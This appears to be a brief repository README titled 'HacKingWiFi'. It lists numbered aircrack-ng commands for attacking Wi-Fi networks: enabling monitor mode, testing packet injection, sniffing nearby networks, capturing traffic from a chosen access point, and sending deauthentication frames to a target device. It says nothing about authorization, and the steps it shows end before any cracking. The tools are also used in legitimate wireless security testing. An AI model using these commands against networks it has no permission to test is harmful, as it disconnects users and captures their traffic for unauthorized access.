# HacKingWiFi
HacKingWiFi 


## Algorithm Commands to HacKing WiFi 

- [1] Choosing Wireless Adapter / Get Interface:
  - [1.1] Cheking for Wireless Network interface: `iwconfig`  
  - [1.2] Cheking for Wireless Network interface: `ifconfig`

- [2] Start Monitoring Mode & Checking Injection Option 
  - [2.1] Starting Monitor mode: `airmon-ng start $INTERFACE`
  - [2.2] Monitoring: `aireplay-ng --test $INTERFACE`
  
- [3] Scan Wireless’s Area
  - [3.1] Sniff Networks Area Information : `airodump-ng $INTERFACE`
  - [3.2] Start Capturing Packets: `airodump-ng --bssid $BSSID -c $CHANNEL_NUMBER -w $Capture_Name $INTERFACE`
  - [3.3] Inject Packets into Wireless Network: `aireplay-ng --deauth 10 -a $MAC_TARGET $INTERFACE`
